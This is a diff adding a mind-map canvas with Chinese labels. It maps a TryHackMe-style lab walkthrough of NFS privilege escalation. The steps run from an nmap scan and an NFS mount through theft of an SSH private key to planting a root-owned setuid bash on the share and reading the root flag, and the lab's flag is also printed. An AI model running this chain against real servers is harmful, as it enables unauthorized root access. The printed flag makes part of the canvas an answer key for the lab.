@@ -1,0 +1,32 @@
+{
+	"nodes":[
+		{"id":"223c2f52d76900fe","type":"text","text":"端口扫描                           \n`nmap -A -p- rhost-ip`","x":-980,"y":-340,"width":240,"height":80,"color":"1"},
+		{"id":"4756b2cf8983ba81","type":"text","text":"挂载NFS目录                               \n`sudo mount -t nfs IP:share /tmp/mount/ -nolock`\n","x":-980,"y":-145,"width":480,"height":80},
+		{"id":"5bbdaf7df9d6c4ba","type":"text","text":"查找可利用文件    \n`cd /tmp/mount`                  \n`ls -a`                     \n`cd /tmp/mount/cappucino`   \n`ls -a`","x":-980,"y":11,"width":280,"height":160},
+		{"id":"d60db750287fba8f","type":"text","text":"发现**.ssh/id_rsa**\n\n`ls  ./.ssh`              \n\n","x":-980,"y":270,"width":280,"height":100},
+		{"id":"7c7873c86570134c","type":"text","text":"ssh登陆                                                          \n`cp ./.ssh/id_rsa  ./`                                \n`ssh -i ./id_rsa cappucino@10.10.250.5` \n`whoami`","x":-980,"y":457,"width":400,"height":110,"color":"2"},
+		{"id":"bc9647b7dd1f9597","type":"text","text":"目标主机                                                                             \n`scp -O -i id_rsa cappucino@10.10.250.5:/bin/bash ./bash`","x":-667,"y":11,"width":535,"height":105},
+		{"id":"b8b22e20eeca4733","type":"text","text":"枚举NFS目录\n`/usr/sbin/showmount -e [IP]`","x":-655,"y":-340,"width":300,"height":80},
+		{"id":"6f2e02d1a36bc1ae","type":"text","text":"尝试下载bash(需与目标主机版本号一致)","x":-170,"y":-340,"width":380,"height":80,"color":"2"},
+		{"id":"e7c29115f39b67ad","type":"text","text":"拷贝到NFS目录\n\n`cp ./bash /tmp/mount/cappucino/`\n","x":-130,"y":171,"width":340,"height":89},
+		{"id":"e598c6205fce4ba2","type":"text","text":"网络下载 ：\n\n`wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`","x":-115,"y":-145,"width":325,"height":156},
+		{"id":"7c0ec5578b45272b","type":"text","text":"执行 bash文件提权\n\n`./bash -p`","x":-460,"y":457,"width":290,"height":110},
+		{"id":"20d438907d7cbd9a","type":"text","text":"获取flag权限\n\n`whoami`\n`cat /root/root.txt`\n`THM{nfs_got_pwned}`\n","x":-70,"y":422,"width":280,"height":145,"color":"4"},
+		{"id":"39e828fb59511850","type":"text","text":"修改权限\n\n`sudo chown root ./bash`  \n`sudo chmod +s ./bash`\n","x":-645,"y":196,"width":290,"height":124}
+	],
+	"edges":[
+		{"id":"1270359fc95f91cf","fromNode":"b8b22e20eeca4733","fromSide":"bottom","toNode":"4756b2cf8983ba81","toSide":"top"},
+		{"id":"aa36dd227cbf395c","fromNode":"d60db750287fba8f","fromSide":"bottom","toNode":"7c7873c86570134c","toSide":"top"},
+		{"id":"4de531bc3ffbae01","fromNode":"5bbdaf7df9d6c4ba","fromSide":"bottom","toNode":"d60db750287fba8f","toSide":"top"},
+		{"id":"021e95cdab4d0a1c","fromNode":"4756b2cf8983ba81","fromSide":"bottom","toNode":"5bbdaf7df9d6c4ba","toSide":"top"},
+		{"id":"9c1c0fece02a63cc","fromNode":"6f2e02d1a36bc1ae","fromSide":"bottom","toNode":"bc9647b7dd1f9597","toSide":"top"},
+		{"id":"3781c3369b81bdc7","fromNode":"6f2e02d1a36bc1ae","fromSide":"bottom","toNode":"e598c6205fce4ba2","toSide":"top"},
+		{"id":"fce75fabd85c9d87","fromNode":"223c2f52d76900fe","fromSide":"right","toNode":"b8b22e20eeca4733","toSide":"left"},
+		{"id":"fb6b0b3607e0d3d3","fromNode":"e598c6205fce4ba2","fromSide":"bottom","toNode":"e7c29115f39b67ad","toSide":"top"},
+		{"id":"1c56ff8418c172f3","fromNode":"bc9647b7dd1f9597","fromSide":"right","toNode":"e7c29115f39b67ad","toSide":"top"},
+		{"id":"f1da11c387ed8cd0","fromNode":"e7c29115f39b67ad","fromSide":"left","toNode":"39e828fb59511850","toSide":"right"},
+		{"id":"c4811732e790759e","fromNode":"39e828fb59511850","fromSide":"bottom","toNode":"7c0ec5578b45272b","toSide":"top"},
+		{"id":"4be34c0eed1c36f0","fromNode":"7c7873c86570134c","fromSide":"right","toNode":"7c0ec5578b45272b","toSide":"left"},
+		{"id":"4b37d6b5e42b4c4e","fromNode":"7c0ec5578b45272b","fromSide":"right","toNode":"20d438907d7cbd9a","toSide":"left"}
+	]
+}
